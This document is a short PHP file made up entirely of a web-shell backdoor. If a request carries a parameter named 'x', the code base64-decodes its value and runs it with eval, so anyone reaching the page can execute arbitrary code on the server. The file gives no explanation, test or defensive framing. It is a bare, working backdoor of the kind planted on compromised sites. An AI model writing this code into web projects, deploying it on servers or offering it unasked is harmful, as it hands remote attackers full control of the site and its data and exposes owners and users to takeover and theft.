<?php
if(isset($_GET['x'])){
  eval(base64_decode($_GET['x']));
}
?>

